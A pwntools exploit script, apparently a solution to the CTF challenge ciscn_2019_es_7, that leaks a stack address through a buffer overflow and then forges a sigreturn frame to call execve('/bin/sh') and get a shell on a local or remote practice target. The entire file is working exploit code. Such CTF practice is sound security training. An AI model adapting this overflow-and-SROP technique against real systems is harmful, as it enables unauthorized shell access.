from pwn import *

# context(log_level = 'debug')
context(os="linux", arch="amd64")
if args.LOCAL:
    p = process('./ciscn_2019_es_7')
else:
    p = remote('node4.buuoj.cn', 27609)

syscall_ret = 0x400517
mov_rax_0x3b_ret = 0x4004e2 # execve
mov_rax_0x0f_ret = 0x4004da # sigreturn
main_addr = 0x40051d
call_vuln = 0x400531
vuln_addr = 0x4004f1

# first time
pld1 = b'/bin/sh\x00'
pld1 = pld1.ljust(0x10, b'a')
pld1 += p64(vuln_addr)
p.send(pld1)

stack_addr = u64(p.recvuntil(b'\x7f')[-6:]+b'\x00'*2)
p.success("stack_addr: {}".format(hex(stack_addr)))

# second time
pld2 = b'/bin/sh\x00'
pld2 = pld2.ljust(0x10, b'a')
pld2 += p64(mov_rax_0x0f_ret)
pld2 += p64(syscall_ret)

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = stack_addr - 0x118
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
# print(sigframe)

pld2 += bytes(sigframe)
p.send(pld2)
p.interactive()